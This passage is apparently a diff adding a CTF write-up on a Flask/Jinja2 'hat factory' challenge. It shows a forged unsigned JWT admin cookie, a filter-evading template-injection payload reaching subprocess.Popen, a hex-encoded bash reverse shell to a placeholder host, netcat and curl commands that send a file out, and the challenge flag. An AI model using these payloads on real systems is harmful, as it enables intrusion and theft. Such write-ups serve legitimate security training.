+&lt;class 'cryptography.hazmat.backends.interfaces.DSABackend'&gt;, 
+&lt;class 'cryptography.hazmat.backends.interfaces.EllipticCurveBackend'&gt;, 
+&lt;class 'cryptography.hazmat.backends.interfaces.PEMSerializationBackend'&gt;, 
+&lt;class 'cryptography.hazmat.backends.interfaces.DERSerializationBackend'&gt;, 
+&lt;class 'cryptography.hazmat.backends.interfaces.X509Backend'&gt;, 
+&lt;class 'cryptography.hazmat.backends.interfaces.DHBackend'&gt;, 
+&lt;class 'cryptography.hazmat.backends.interfaces.ScryptBackend'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.HashAlgorithm'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.HashContext'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.ExtendableOutputFunction'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.Hash'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHA1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHA512_224'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHA512_256'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHA224'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHA256'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHA384'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHA512'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHA3_224'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHA3_256'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHA3_384'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHA3_512'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHAKE128'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.SHAKE256'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.MD5'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.BLAKE2b'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.hashes.BLAKE2s'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.utils.Prehashed'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.serialization.base.KeySerializationEncryption'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.serialization.base.BestAvailableEncryption'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.serialization.base.NoEncryption'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAParameters'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateKey'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAPublicKey'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAParameterNumbers'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAPublicNumbers'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateNumbers'&gt;, 
+&lt;class 'cryptography.hazmat._oid.ObjectIdentifier'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurveOID'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurve'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurveSignatureAlgorithm'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePrivateKey'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicKey'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECT571R1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECT409R1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECT283R1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECT233R1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECT163R2'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECT571K1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECT409K1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECT283K1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECT233K1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECT163K1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECP521R1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECP384R1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECP256R1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECP256K1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECP224R1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.SECP192R1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP256R1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP384R1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP512R1'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.ECDSA'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicNumbers'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePrivateNumbers'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ec.ECDH'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PublicKey'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PrivateKey'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateNumbers'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicNumbers'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.padding.AsymmetricPadding'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.padding.PKCS1v15'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.padding.PSS'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.padding.OAEP'&gt;, 
+&lt;class 'cryptography.hazmat.primitives.asymmetric.padding.MGF1'&gt;, 
+&lt;class 'jwt.algorithms.Algorithm'&gt;, 
+&lt;class 'jwt.api_jws.PyJWS'&gt;, 
+&lt;class 'jinja2.ext.Extension'&gt;, 
+&lt;class 'jinja2.ext._CommentFinder'&gt;, 
+&lt;class 'jinja2.debug.TracebackFrameProxy'&gt;, 
+&lt;class 'jinja2.debug.ProcessedTraceback'&gt;]
+</code></p>
+
+<p>You can use the <code>__dir__()</code> method to enumerate all the methods that can be called from this result.</p>
+
+<p>```
+GET /makehat?hatName={{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fdir\x5f\x5f')()}} HTTP/1.1
+Host: challs.xmas.htsp.ro:11005
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://challs.xmas.htsp.ro:11005/register
+Connection: close
+Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0</p>
+
+<p>HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 19 Dec 2019 10:00:30 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 1385
+Connection: close</p>
+
+<p><head>
+    <link rel="stylesheet" type="text/css" href="/static/css/styles.css">
+</head></p>
+
+<p><body>
+    <div class="navbar">
+<a style="float: left" href="/">Home</a></p>
+
+<pre><code>&lt;a href="/login"&gt;Login&lt;/a&gt;
+&lt;a href="/register"&gt;Register&lt;/a&gt;
+</code></pre>
+
+<p></div>
+    <div class="container" style="text-align:center">
+        <img class="hat" src="/static/img/hats/7.png">
+        <h1>You are viewing:<br><span style="color:#FFA144;">[&#39;<strong>repr</strong>&#39;, &#39;<strong>hash</strong>&#39;, &#39;<strong>getattribute</strong>&#39;, &#39;<strong>lt</strong>&#39;, &#39;<strong>le</strong>&#39;, &#39;<strong>eq</strong>&#39;, &#39;<strong>ne</strong>&#39;, &#39;<strong>gt</strong>&#39;, &#39;<strong>ge</strong>&#39;, &#39;<strong>iter</strong>&#39;, &#39;<strong>init</strong>&#39;, &#39;<strong>len</strong>&#39;, &#39;<strong>getitem</strong>&#39;, &#39;<strong>setitem</strong>&#39;, &#39;<strong>delitem</strong>&#39;, &#39;<strong>add</strong>&#39;, &#39;<strong>mul</strong>&#39;, &#39;<strong>rmul</strong>&#39;, &#39;<strong>contains</strong>&#39;, &#39;<strong>iadd</strong>&#39;, &#39;<strong>imul</strong>&#39;, &#39;<strong>new</strong>&#39;, &#39;<strong>reversed</strong>&#39;, &#39;<strong>sizeof</strong>&#39;, &#39;clear&#39;, &#39;copy&#39;, &#39;append&#39;, &#39;insert&#39;, &#39;extend&#39;, &#39;pop&#39;, &#39;remove&#39;, &#39;index&#39;, &#39;count&#39;, &#39;reverse&#39;, &#39;sort&#39;, &#39;<strong>doc</strong>&#39;, &#39;<strong>str</strong>&#39;, &#39;<strong>setattr</strong>&#39;, &#39;<strong>delattr</strong>&#39;, &#39;<strong>reduce<em>ex</strong>&#39;, &#39;<strong>reduce</strong>&#39;, &#39;<strong>subclasshook</strong>&#39;, &#39;<strong>init</em>subclass</strong>&#39;, &#39;<strong>format</strong>&#39;, &#39;<strong>dir</strong>&#39;, &#39;<strong>class</strong>&#39;]</span></h1>
+    </div>
+</body></p>
+
+<script src="/static/js/snow.js"></script>
+
+<p>```</p>
+
+<p>There is an interesting <code>__getitem__()</code> method that can be used to retrieve the data from the list using the index but without using <code>[]</code>.</p>
+
+<p>The <code>&lt;class 'subprocess.Popen'&gt;</code> class is at position number <code>215</code> and allow us to launch commands.</p>
+
+<p>We can setup a server listening on port <code>1337</code> with <code>nc -lk 1337</code> and then encode a reverse shell that will be launched on the victim host in order to connect to our server.</p>
+
+<p>```
+/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/1337 0>&amp;1"</p>
+
+<p>\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x63\x20\x22\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x78\x2e\x78\x2e\x78\x2e\x78\x2f\x31\x33\x33\x37\x20\x30\x3e\x26\x31\x22
+```</p>
+
+<p>The request will be the following.</p>
+
+<p><code>
+GET /makehat?hatName={{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(215)('\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x63\x20\x22\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x78\x2e\x78\x2e\x78\x2e\x78\x2f\x31\x33\x33\x37\x20\x30\x3e\x26\x31\x22',shell=True)}} HTTP/1.1
+Host: challs.xmas.htsp.ro:11005
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://challs.xmas.htsp.ro:11005/register
+Connection: close
+Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+</code></p>
+
+<p>On the victim host an interesting file can be found: <code>unusual_flag.mp4</code>. It can be transferred like the following:
+* on the attacker machine: <code>nc -l -p 8000 &gt; unusual_flag.mp4</code>;
+* on the victim machine: <code>curl -X POST --data-binary @unusual_flag.mp4 http://x.x.x.x:8000</code>.</p>
+
+<p>At this point you have to remove the HTTP headers inserted into the created file by <code>nc</code> and then you can launch the MP4 video <a href="unusual_flag.mp4">unusual_flag.mp4</a>.</p>
+
+<p>Into the video there is the flag.</p>
+
+<p><code>
+X-MAS{W3lc0m3_70_7h3_h4t_f4ct0ry__w3ve_g0t_unusu4l_h4ts_90d81c091da}
+</code></p>
